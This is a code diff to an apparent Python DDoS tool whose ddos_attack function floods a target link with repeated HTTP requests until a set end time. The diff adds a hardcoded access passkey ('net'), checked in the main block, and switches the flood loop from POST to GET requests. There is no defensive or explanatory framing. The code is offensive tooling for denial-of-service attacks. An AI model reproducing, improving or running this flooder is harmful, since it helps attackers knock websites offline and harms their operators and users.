@@ -12,6 +12,11 @@ COLOR_CODE = {
     "RED": "\033[31m",
 }
 
+def valid_passkey():
+    passkey = "net"   # Set passkey here
+    user_input = input(Fore.GREEN + "Enter passkey to access the tool: ")
+    return user_input == passkey
+
 
 def clear_console():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -52,8 +57,8 @@ def ddos_attack():
     def send_request(session):
         while time.time() < end_time:
             try:
-                session.post(link)
-                print(f"{COLOR_CODE['GREEN']} POST Request sent to: {link}{COLOR_CODE['RESET']}")
+                session.get(link)
+                print(f"{COLOR_CODE['GREEN']} -GET Request sent to: {link}{COLOR_CODE['RESET']}")
             except requests.RequestException:
                 print(f"{COLOR_CODE['RED']}ERROR ERROR ERROR {link}{COLOR_CODE['RESET']}")
     
@@ -75,4 +80,8 @@ def ddos_attack():
     print(Colorate.Horizontal(Colors.green_to_white, "\nAttack Stopped"))
 
 if __name__ == "__main__":
+    passkey = input("Enter the passkey to access the tool: ")
+    if passkey != "net":
+        print(Fore.RED + "Invalid passkey!")
+        sys.exit()
     ddos_attack()
